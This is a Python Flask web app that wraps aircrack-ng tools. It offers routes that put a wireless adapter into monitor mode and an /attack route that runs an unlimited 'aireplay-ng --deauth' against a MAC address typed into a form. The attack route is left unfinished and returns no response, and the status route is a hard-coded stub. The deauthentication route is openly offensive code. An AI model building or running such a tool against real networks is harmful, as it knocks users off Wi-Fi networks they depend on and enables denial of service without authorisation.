from flask import Flask, render_template, request
import subprocess

app = Flask(__name__)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/config", methods=["GET", "POST"])
def config():
    result = ""
    if request.method == "POST":
        mode = request.form.get("mode")
        command = []
        if mode == "monitor":
            command = [
                "airmon-ng",
                "start",
                "wlan0",
            ]  # Replace 'wlan0' with your wireless adapter name
        elif mode == "managed":
            command = [
                "airmon-ng",
                "stop",
                "wlan0",
            ]  # Replace 'wlan0' with your wireless adapter name
        else:
            return render_template("config.html", result="wrong mode")
        result =  mode.capitalize()
        try:
            subprocess.run(command, check=True)
            result = f"Device set to {result} mode"
        except Exception as error:
            print(error)
            result = f"Error configuring {result} mode"
    return render_template("config.html", result= result)


@app.route("/status")
def status():
    # Logic to retrieve the current status of the wireless adapter
    # Capture the output and pass it to the template
    adapter_status = "Monitor mode"
    return render_template("status.html", adapter_status=adapter_status)

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    # Deauthentication attack logic
    interface = 'wlan0'  # Replace 'wlan0' with your wireless adapter name
    target_mac = request.form.get('target_mac', '')  # Get the target MAC address from the form input

    if request.method == 'POST' and target_mac:
        # Execute the deauthentication attack command
        command = ['aireplay-ng', '--deauth', '0', '-a', target_mac, interface]

        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True)
            result = "Deauthentication attack completed"
        except subprocess.CalledProcessError as e:
            output = e.output
            result = "Failed to execute deauthentication attack"



if __name__ == "__main__":
    app.run(debug=True)
